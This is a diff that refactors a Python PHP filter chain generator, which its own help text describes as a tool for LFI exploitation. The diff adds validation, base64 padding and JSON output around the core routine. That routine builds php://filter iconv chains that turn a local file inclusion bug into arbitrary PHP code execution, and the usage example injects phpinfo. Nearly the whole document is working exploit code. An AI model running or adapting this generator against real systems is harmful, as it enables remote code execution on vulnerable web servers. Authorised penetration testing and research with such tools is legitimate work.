@@ -2,6 +2,8 @@
 import argparse
 import base64
 import re
+import json
+import sys
 
 # - Useful infos -
 # https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
@@ -79,53 +81,225 @@ conversions = {
     '=': ''
 }
 
-def generate_filter_chain(chain, debug_base64 = False):
+class FilterChainError(Exception):
+    """Custom exception for filter chain generation errors."""
+    pass
 
-    encoded_chain = chain
-    # generate some garbage base64
-    filters = "convert.iconv.UTF8.CSISO2022KR|"
-    filters += "convert.base64-encode|"
-    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file
-    filters += "convert.iconv.UTF8.UTF7|"
+def validate_input(input_string, input_type="chain"):
+    """
+    Validate input string for specific requirements.
+    
+    Args:
+        input_string (str): The input string to validate
+        input_type (str): Type of input ('chain' or 'base64')
+    
+    Returns:
+        bool: True if valid
+    
+    Raises:
+        FilterChainError: If validation fails
+    """
+    if not input_string:
+        raise FilterChainError(f"Empty {input_type} provided")
+    
+    if input_type == "base64":
+        # Validate base64 characters
+        if not re.match("^[A-Za-z0-9+/]*={0,2}$", input_string):
+            raise FilterChainError("Invalid base64 string. Only alphanumeric characters, +, /, and = are allowed")
+    
+    elif input_type == "chain":
+        # For chain input, we allow any printable ASCII characters
+        # but warn about potentially problematic characters
+        try:
+            input_string.encode('utf-8')
+        except UnicodeEncodeError:
+            raise FilterChainError("Input contains non-UTF-8 characters")
+        
+        # Check for null bytes or other control characters that might cause issues
+        if '\x00' in input_string:
+            raise FilterChainError("Input contains null bytes which may cause issues")
+    
+    return True
 
+def auto_pad_base64(base64_string):
+    """
+    Automatically pad base64 string to ensure it's properly formatted.
+    
+    Args:
+        base64_string (str): Base64 string that may need padding
+    
+    Returns:
+        str: Properly padded base64 string
+    """
+    # Remove existing padding
+    base64_string = base64_string.rstrip('=')
+    
+    # Calculate required padding
+    padding_needed = (4 - len(base64_string) % 4) % 4
+    
+    # Add padding
+    return base64_string + '=' * padding_needed
 
-    for c in encoded_chain[::-1]:
-        filters += conversions[c] + "|"
-        # decode and reencode to get rid of everything that isn't valid base64
-        filters += "convert.base64-decode|"
+def generate_filter_chain(chain, debug_base64=False):
+    """
+    Generate PHP filter chain for the given input.
+    
+    Args:
+        chain (str): The base64 encoded chain
+        debug_base64 (bool): Whether to output base64 debug format
+    
+    Returns:
+        str: Generated filter chain
+    
+    Raises:
+        FilterChainError: If chain generation fails
+    """
+    try:
+        encoded_chain = chain
+        
+        # Validate that all characters in the chain are supported
+        for c in encoded_chain:
+            if c not in conversions:
+                raise FilterChainError(f"Unsupported character '{c}' in base64 string")
+        
+        # Generate some garbage base64
+        filters = "convert.iconv.UTF8.CSISO2022KR|"
         filters += "convert.base64-encode|"
-        # get rid of equal signs
+        # Make sure to get rid of any equal signs in both the string we just generated and the rest of the file
         filters += "convert.iconv.UTF8.UTF7|"
-    if not debug_base64:
-        # don't add the decode while debugging chains
-        filters += "convert.base64-decode"
 
-    final_payload = f"php://filter/{filters}/resource={file_to_use}"
-    return final_payload
+        for c in encoded_chain[::-1]:
+            filters += conversions[c] + "|"
+            # Decode and reencode to get rid of everything that isn't valid base64
+            filters += "convert.base64-decode|"
+            filters += "convert.base64-encode|"
+            # Get rid of equal signs
+            filters += "convert.iconv.UTF8.UTF7|"
+        
+        if not debug_base64:
+            # Don't add the decode while debugging chains
+            filters += "convert.base64-decode"
+
+        final_payload = f"php://filter/{filters}/resource={file_to_use}"
+        return final_payload
+    
+    except Exception as e:
+        raise FilterChainError(f"Failed to generate filter chain: {str(e)}")
+
+def output_result(result_data, output_format="text"):
+    """
+    Output the result in the specified format.
+    
+    Args:
+        result_data (dict): Dictionary containing result information
+        output_format (str): Output format ('text' or 'json')
+    """
+    if output_format == "json":
+        print(json.dumps(result_data, indent=2))
+    else:
+        # Text format (default)
+        if "error" in result_data:
+            print(f"[-] Error: {result_data['error']}")
+        else:
+            print(f"[+] The following gadget chain will generate the following code: {result_data['original_input']} (base64 value: {result_data['base64_value']})")
+            print(result_data['filter_chain'])
 
 def main():
-
     # Parsing command line arguments
-    parser = argparse.ArgumentParser(description="PHP filter chain generator.")
+    parser = argparse.ArgumentParser(
+        description="PHP filter chain generator for LFI exploitation.",
+        epilog="Example: python3 %(prog)s --chain '<?php phpinfo(); ?>' --output json"
+    )
 
-    parser.add_argument("--chain", help="Content you want to generate. (you will maybe need to pad with spaces for your payload to work)", required=False)
-    parser.add_argument("--rawbase64", help="The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.", required=False)
+    parser.add_argument(
+        "--chain", 
+        help="Content you want to generate (automatic base64 padding applied)", 
+        required=False
+    )
+    parser.add_argument(
+        "--rawbase64", 
+        help="The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.", 
+        required=False
+    )
+    parser.add_argument(
+        "--output", 
+        choices=["text", "json"], 
+        default="text",
+        help="Output format (default: text)"
+    )
+    parser.add_argument(
+        "--no-padding", 
+        action="store_true",
+        help="Disable automatic base64 padding for --chain input"
+    )
+    
     args = parser.parse_args()
-    if args.chain is not None:
-        chain = args.chain.encode('utf-8')
-        base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
-        chain = generate_filter_chain(base64_value)
-        print("[+] The following gadget chain will generate the following code : {} (base64 value: {})".format(args.chain, base64_value))
-        print(chain)
-    if args.rawbase64 is not None:
-        rawbase64 = args.rawbase64.replace("=", "")
-        match = re.search("^([A-Za-z0-9+/])*$", rawbase64)
-        if (match):
-            chain = generate_filter_chain(rawbase64, True)
-            print(chain)
-        else:
-            print ("[-] Base64 string required.")
-            exit(1)
+    
+    # Validate that at least one argument is provided
+    if not args.chain and not args.rawbase64:
+        parser.error("Either --chain or --rawbase64 must be provided")
+    
+    # Validate that both arguments are not provided simultaneously
+    if args.chain and args.rawbase64:
+        parser.error("Cannot use both --chain and --rawbase64 simultaneously")
+    
+    result_data = {}
+    
+    try:
+        if args.chain is not None:
+            # Validate chain input
+            validate_input(args.chain, "chain")
+            
+            # Encode to base64
+            chain_bytes = args.chain.encode('utf-8')
+            base64_value = base64.b64encode(chain_bytes).decode('utf-8')
+            
+            # Apply automatic padding unless disabled
+            if not args.no_padding:
+                base64_value = auto_pad_base64(base64_value)
+            
+            # Remove padding for filter generation
+            base64_for_filter = base64_value.replace("=", "")
+            
+            # Generate filter chain
+            filter_chain = generate_filter_chain(base64_for_filter)
+            
+            result_data = {
+                "original_input": args.chain,
+                "base64_value": base64_value,
+                "base64_for_filter": base64_for_filter,
+                "filter_chain": filter_chain,
+                "auto_padding_applied": not args.no_padding
+            }
+            
+        elif args.rawbase64 is not None:
+            # Validate base64 input
+            validate_input(args.rawbase64, "base64")
+            
+            # Remove padding for processing
+            rawbase64 = args.rawbase64.replace("=", "")
+            
+            # Generate debug filter chain
+            filter_chain = generate_filter_chain(rawbase64, True)
+            
+            result_data = {
+                "original_base64": args.rawbase64,
+                "base64_for_filter": rawbase64,
+                "filter_chain": filter_chain,
+                "debug_mode": True
+            }
+        
+        # Output result
+        output_result(result_data, args.output)
+        
+    except FilterChainError as e:
+        result_data = {"error": str(e)}
+        output_result(result_data, args.output)
+        sys.exit(1)
+    except Exception as e:
+        result_data = {"error": f"Unexpected error: {str(e)}"}
+        output_result(result_data, args.output)
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
